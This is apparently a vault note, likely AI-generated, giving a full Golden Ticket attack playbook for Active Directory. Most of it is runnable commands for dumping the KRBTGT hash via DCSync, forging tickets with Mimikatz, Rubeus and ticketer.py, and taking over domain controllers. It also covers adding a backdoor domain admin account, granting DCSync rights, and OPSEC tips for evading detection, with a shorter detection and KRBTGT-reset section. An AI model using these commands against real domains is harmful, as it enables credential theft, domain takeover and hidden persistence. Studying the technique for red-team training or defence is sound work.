---
title: "Attack #11 — Golden Ticket Attack"
description: "The Golden Ticket attack is the most powerful persistence technique in Active Directory. It exploits the fundamental trust model of the Kerberos protocol…"
category: active-directory
tags: ["active-directory", "kerberos", "credential-access", "privilege-escalation", "persistence"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "Evil-WinRM"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Two/🟠 Attack #11 — Golden Ticket Attack.md"
---
# 🟠 Attack #11 — Golden Ticket Attack

***

## 📖 How It Works

The Golden Ticket attack is **the most powerful persistence technique in Active Directory**. It exploits the fundamental trust model of the Kerberos protocol — every TGT in the entire domain is signed and encrypted using the **KRBTGT account's hash**, and the Domain Controller trusts any TGT bearing a valid KRBTGT signature without further verification. If an attacker obtains the KRBTGT hash, they can **forge entirely fake TGTs for any user, with any group memberships, any privileges, and any ticket lifetime** — completely offline, without ever contacting the DC again.

The resulting forged ticket is cryptographically indistinguishable from a legitimate one because it is signed with the real KRBTGT key. The attacker can impersonate the Domain Administrator, add themselves to any group (including non-existent ones), set ticket lifetimes of 10 years, and authenticate to any service in the domain — including after the legitimate admin's password is changed, after the attacker's account is deleted, and even after the attacker's physical access is revoked. The **only way to invalidate a Golden Ticket** is to reset the KRBTGT password **twice** — once is insufficient because both the current and previous hash are accepted.

### What You Need to Forge a Golden Ticket

| Parameter | Where to Get It | Notes |
|---|---|---|
| **KRBTGT NT hash** | DCSync, NTDS.dit dump, LSASS on DC | The master key — the entire attack depends on this |
| **KRBTGT AES256 key** | Mimikatz `sekurlsa::ekeys` on DC | Preferred — stealthier than RC4 |
| **Domain SID** | `whoami /user`, PowerView, `Get-ADDomain` | e.g. `S-1-5-21-...` — everything before the last `-` |
| **Domain FQDN** | `$env:USERDNSDOMAIN`, `ipconfig /all` | e.g. `corp.local` |
| **Target username** | Any valid or forged username | Post-Nov 2021 patches require real username |

### The Full Attack Flow

```
1. Compromise any path to Domain Admin (spraying → lateral movement → priv esc)
2. Extract KRBTGT hash via DCSync or NTDS.dit dump
3. Collect domain SID
4. Forge a Golden Ticket offline (no DC contact needed)
5. Inject into current session (kerberos::ptt / Rubeus ptt)
6. Access any domain resource as the forged user — permanently
7. Even if your account is deleted / password changed → ticket still works
8. Persist indefinitely until KRBTGT password is reset TWICE
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain Admin or DC access** | Required to extract the KRBTGT hash — this is a post-DA persistence technique |
| **KRBTGT NT hash or AES key** | Obtained via DCSync, NTDS.dit dump, or Mimikatz on DC |
| **Domain SID** | Available from any domain-joined host with low-priv access |
| **Valid domain username** | Post-Nov 2021 Windows updates require the forged username to exist in AD |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Mimikatz** | Windows | `kerberos::golden` — original Golden Ticket forge command |
| **Rubeus** | Windows | `golden` subcommand — cleaner, supports AES, `/ptt` injection |
| **Impacket — ticketer.py** | Linux | Linux-based Golden Ticket forging; outputs `.ccache` file |
| **Impacket — secretsdump.py** | Linux | Extract KRBTGT hash via DCSync before forging |
| **CrackMapExec / NetExec** | Linux | `--use-kcache` to authenticate with the forged ticket |
| **Evil-WinRM** | Linux | Accepts `KRB5CCNAME` for Golden Ticket-based shell |

***

## 💻 Full Commands

### 🔵 Step 0 — Extract KRBTGT Hash (DCSync Method — Most Common)

```powershell
# ── Mimikatz DCSync — pull KRBTGT hash from any domain-joined machine ──────────
# (Requires DA or account with Replication rights)
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt

# Output will contain:
# Hash NTLM: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d  ← NT hash (RC4)
# aes256_hmac: b65fb27c8e0d7c5f48b16c10b4...   ← AES256 key (preferred)
# aes128_hmac: a1b2c3d4e5f6a7b8c9d0e1f2...     ← AES128 key

# ── Also pull domain SID while you're at it ───────────────────────────────────
lsadump::dcsync /domain:corp.local /user:Administrator
# Domain SID is embedded in the output: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

```bash
# ── Linux — DCSync via Impacket ────────────────────────────────────────────────
secretsdump.py corp.local/Administrator:'Password1'@DC01.corp.local -just-dc-user krbtgt

# Using NT hash (PtH)
secretsdump.py corp.local/Administrator@DC01.corp.local \
  -hashes :8846f7eaee8fb117ad06bdd830b7586c -just-dc-user krbtgt

# Extract NTLM hash — it's the right side of:
# corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::
#                                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#                                                           This is your KRBTGT NT hash
```

***

### 🔵 Step 0b — Get Domain SID

```powershell
# Windows — multiple methods
whoami /user                              # SID of current user — remove last -RID
Get-ADDomain | Select-Object DomainSID
(Get-ADUser -Identity Administrator).SID  # Remove last segment (-500)

# PowerView
Get-DomainSID

# Example SID: S-1-5-21-3878595448-1012506728-1948843120
# Domain SID = S-1-5-21-3878595448-1012506728-1948843120
# (just drop the trailing -RID, e.g. -500 for Administrator)
```

```bash
# Linux — via lookupsid.py
lookupsid.py corp.local/low_user:'Password1'@DC01.corp.local 0
# Output: [*] Domain SID is: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

***

### 🔴 Mimikatz — Forge & Inject Golden Ticket (Windows)

```powershell
# ── Standard Golden Ticket — impersonate Administrator ────────────────────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /krbtgt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /ptt

# ── Flags explained:
# /user    = username to impersonate (must exist post-Nov 2021 patches)
# /domain  = target domain FQDN
# /sid     = domain SID (not user SID — no trailing RID)
# /krbtgt  = KRBTGT NT hash (RC4)
# /ptt     = inject directly into current session (pass-the-ticket)

# ── Golden Ticket with AES256 (stealthiest — no RC4 downgrade in logs) ────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /aes256:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt

# ── Save to .kirbi file (for later use / transfer to another machine) ─────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /krbtgt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /ticket:golden_admin.kirbi

# Inject saved .kirbi later
kerberos::ptt golden_admin.kirbi

# ── Forge ticket with extended lifetime (10 years) ───────────────────────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /krbtgt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /startoffset:0 /endin:600 /renewmax:10080 \
  /ptt

# ── Forge ticket for a fake/non-existent user (older DCs without Nov 2021 patch)
kerberos::golden \
  /user:hax0r_da \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /krbtgt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /groups:512,513,518,519,520 \
  /ptt
# /groups = RID list to embed (512=DA, 513=DU, 518=Schema, 519=EA, 520=GPO)

# ── Verify injection ──────────────────────────────────────────────────────────
klist
# Should show ticket for Administrator@CORP.LOCAL with long lifetime

# ── Use the Golden Ticket ─────────────────────────────────────────────────────
dir \\DC01.corp.local\C$
psexec.exe \\DC01.corp.local cmd.exe
```

***

### 🔴 Rubeus — Forge Golden Ticket (Windows — Modern Approach)

```powershell
# ── Golden Ticket with RC4 (NT hash) ─────────────────────────────────────────
.\Rubeus.exe golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /rc4:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /ptt /nowrap

# ── Golden Ticket with AES256 (preferred — blends with normal Kerberos traffic) ─
.\Rubeus.exe golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /aes256:b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  /ptt /nowrap

# ── Inject and save simultaneously ───────────────────────────────────────────
.\Rubeus.exe golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /rc4:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /ptt /outfile:golden_admin.kirbi /nowrap

# ── Verify ────────────────────────────────────────────────────────────────────
.\Rubeus.exe triage
klist
```

***

### 🔴 Impacket — ticketer.py (Linux — Forge Golden Ticket)

```bash
# ── Forge Golden Ticket from Linux using NT hash ──────────────────────────────
ticketer.py -nthash 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  Administrator
# Output: Administrator.ccache

# ── Forge using AES256 key (stealthier) ───────────────────────────────────────
ticketer.py -aesKey b65fb27c8e0d7c5f48b16c10b4c1d91a9b3c2d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  Administrator

# ── Forge with specific extra groups (embed DA + EA group memberships) ────────
ticketer.py -nthash 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -extra-sid S-1-5-21-3878595448-1012506728-1948843120-519 \
  Administrator

# ── Set and use the ticket ────────────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache

# Verify ticket
klist

# Access DC as forged DA
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local

# NetExec
nxc smb DC01.corp.local --use-kcache
nxc smb DC01.corp.local --use-kcache -x "whoami /all"

# Evil-WinRM
evil-winrm -i DC01.corp.local -r corp.local
```

***

### 🔴 Cross-Domain Golden Ticket (Enterprise Admin Access)

```bash
# ── Include Extra SID for Enterprise Admins (cross-domain forest access) ──────
# Extra SID format: <RootDomainSID>-519 (Enterprise Admins RID = 519)
ticketer.py -nthash 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local \
  -extra-sid S-1-5-21-ROOT-DOMAIN-SID-519 \
  Administrator

# ── Mimikatz version ──────────────────────────────────────────────────────────
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /krbtgt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /sids:S-1-5-21-ROOT-DOMAIN-SID-519 \
  /ptt
# /sids = extra SIDs to embed (Enterprise Admins in root domain)
```

***

### 🔴 Post-Golden Ticket — Immediate Actions

```bash
# ── 1. Dump ALL domain hashes (DCSync with forged DA ticket) ──────────────────
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local \
  -just-dc-ntlm -outputfile all_domain_hashes

# ── 2. Create a persistent backdoor domain admin account ─────────────────────
nxc smb DC01.corp.local --use-kcache \
  -x "net user backdoor P@ssword123! /add /domain && net group 'Domain Admins' backdoor /add /domain"

# ── 3. Give own account DCSync rights (ACL persistence — Attack #65) ─────────
# Add Replication-Get-Changes-All to low_user via PowerView
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity low_user \
  -Rights DCSync -Verbose

# ── 4. Add KRBTGT hash to your notes — it's your persistent master key ────────
# Even if DA password changes, KRBTGT hash = permanent domain access
# Until KRBTGT password reset TWICE
```

***

## 🎯 OPSEC Tips

- **Use AES256 over RC4** — RC4-encrypted Golden Tickets generate `EncryptionType: 0x17` in Event 4769, which stands out in AES-enforced environments; AES256 is `EncryptionType: 0x12` and is completely normal
- **Set realistic ticket lifetimes** — a 10-year TGT lifetime is a dead giveaway; set `endin` to 600 minutes (default 10 hours) to blend in
- **Use a real existing username** — post-November 2021 patches validate that the username exists in AD; forged tickets with fake usernames will fail on patched DCs
- **Keep the KRBTGT hash stored securely** — it is your permanent backdoor key; treat it with the same security as a private key
- **Don't inject Golden Tickets on the DC itself** — authentication events from LSASS on a DC are heavily monitored; inject on a workstation and access remotely
- **Request individual TGS tickets** rather than accessing resources broadly — targeted service access is harder to correlate than sweeping domain access

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4769** | Security Log | TGS requested but **no prior 4768** (TGT request) — forged tickets skip the AS-REQ |
| **4769** | Security Log | `EncryptionType: 0x17` (RC4) on a domain enforcing AES |
| **4769** | Security Log | TGS for **non-existent user** (pre-Nov 2021 DCs) — `0x6` error code |
| **4770** | Security Log | TGT renewal — abnormally long remaining lifetime on renewal |
| **4624** | Security Log | Logon Type 3 with Kerberos from a machine the user has no business being on |
| **4672** | Security Log | Special privileges assigned — DA-level access from unexpected host |
| **4728/4732** | Security Log | User added to privileged group shortly before suspicious logon |

**Primary detection signature:** A valid TGS request (4769) with **no corresponding TGT request (4768) from the same IP** is the definitive Golden Ticket indicator — forged TGTs are never presented to the DC as part of an AS-REQ exchange because they were forged offline. Microsoft Defender for Identity (MDI) specifically detects this "TGS without TGT" pattern and raises a high-confidence alert.

### Invalidating Golden Tickets

```powershell
# ── Reset KRBTGT password TWICE (required to invalidate all forged tickets) ────
# First reset — invalidates tickets signed with current hash
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString \
  "NewKrbtgtPassword1!" -AsPlainText -Force)

# Wait 10 hours for replication + ticket expiry, then:
# Second reset — invalidates tickets signed with previous hash
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString \
  "NewKrbtgtPassword2!" -AsPlainText -Force)

# ⚠️ WARNING: Both resets must propagate to ALL DCs before the attacker's
# ticket expires — otherwise the attacker can immediately forge a new one
# from the compromised but not-yet-propagated new hash
```

***

## 🔗 Attack Chain Context

```
[Golden Ticket] ──→ Permanent Domain Ownership
         │
         ├──→ 🔑 Authenticate as any user to any service — indefinitely
         ├──→ 🩸 DCSync on demand — dump all hashes whenever needed
         ├──→ 🌐 Cross-forest access via Extra SID embedding (Attack #69)
         ├──→ 👤 SID History injection — embed historical SIDs for legacy access
         ├──→ 🔒 Survives: password changes, account deletions, DA removals
         └──→ 💀 Only defeated by: KRBTGT password reset × 2
```

**The persistence chain in practice:** An attacker who achieves Domain Admin, runs DCSync to get the KRBTGT hash, and generates a Golden Ticket has **effectively won permanently**. Even if the blue team detects the initial compromise, changes every account password, and removes the attacker's access — the KRBTGT hash doesn't change unless explicitly reset. Most organisations never reset the KRBTGT password during incident response because they don't know it's required, leaving the attacker with indefinite re-entry.

***

> ✅ **Attack #11 — Golden Ticket complete.** Tell me to move on when you're ready for **Attack #12 — Silver Ticket Attack**.

Sources
 What a Golden Ticket Attack Is and How to Defend Against One https://www.legitsecurity.com/aspm-knowledge-base/golden-ticket-attack
 What is a Golden Ticket Attack? - CrowdStrike https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/golden-ticket-attack/
 What Is a Golden Ticket Attack and How to Detect It https://www.huntress.com/cybersecurity-101/topic/what-is-golden-ticket-attack
 What Is a Golden Ticket Attack? Definition & Prevention https://jumpcloud.com/it-index/what-is-a-golden-ticket-attack
 Steal or Forge Kerberos Tickets: Golden Ticket https://attack.mitre.org/techniques/T1558/001/
 Understanding the golden ticket attack with Mimikatz https://netwrix.com/company/resources/blog/golden-ticket-attack-mimikatz-detection-defense/
 How to Defend Against Golden Ticket Attacks: AD Security 101 https://www.semperis.com/blog/how-to-defend-against-golden-ticket-attacks/
 Pass-the-ticket attacks: How to detect and prevent credential theft https://www.manageengine.com/products/eventlog/cyber-security/pass-the-ticket-attack.html
 What Is a Golden Ticket Attack? How It Works, Detection and Prevention https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-ticket-attack/
 Kerberos Protocol: Security Attacks and Solution https://ieeexplore.ieee.org/document/10777133/
 Detecting Abuse of Domain Administrator Privilege Using Windows Event Log https://ieeexplore.ieee.org/document/8631459/
 Detecting Forged Kerberos Tickets in an Active Directory Environment https://arxiv.org/ftp/arxiv/papers/2301/2301.00044.pdf
 RASP for LSASS: Preventing Mimikatz-Related Attacks https://arxiv.org/pdf/2401.00316.pdf
 Ransomware: Analysing the Impact on Windows Active Directory Domain
  Services https://arxiv.org/pdf/2202.03276.pdf
 HADES: Detecting Active Directory Attacks via Whole Network Provenance
  Analytics http://arxiv.org/pdf/2407.18858.pdf
 Catch Me if You Can: Effective Honeypot Placement in Dynamic AD Attack
  Graphs https://arxiv.org/pdf/2312.16820.pdf
 Ransomware: Analysing the Impact on Windows Active Directory Domain Services https://www.mdpi.com/1424-8220/22/3/953/pdf
 The Reversing Machine: Reconstructing Memory Assumptions https://arxiv.org/pdf/2405.00298.pdf
 Can LLMs Hack Enterprise Networks? Autonomous Assumed Breach
  Penetration-Testing Active Directory Networks https://arxiv.org/pdf/2502.04227.pdf
 Detecting and mitigating Active Directory compromises https://www.cyber.gov.au/business-government/detecting-responding-to-threats/detecting-and-mitigating-active-directory-compromises
 Detection Mechanism https://www.manageengine.com/log-management/cyber-security/golden-ticket-attack.html
 Detecting and Preventing the Path to a Golden Ticket With Cortex XDR https://www.paloaltonetworks.com/blog/security-operations/detecting-and-preventing-the-path-to-a-golden-ticket-with-cortex-xdr/
 What is a Golden Ticket Attack? - SentinelOne https://www.sentinelone.com/cybersecurity-101/cybersecurity/golden-ticket-attack/
 Breaking the Ticket: A Beginner's Guide to Kerberos Attacks https://owasp.org/www-chapter-bangkok/slides/2025/2025-02-07_Breaking-the-Ticket-A-Beginners-Guide-to-Kerberos-Attacks.pdf
 T1558.001 Steal or Forge Kerberos Tickets: Golden Ticket https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.001/T1558.001.md
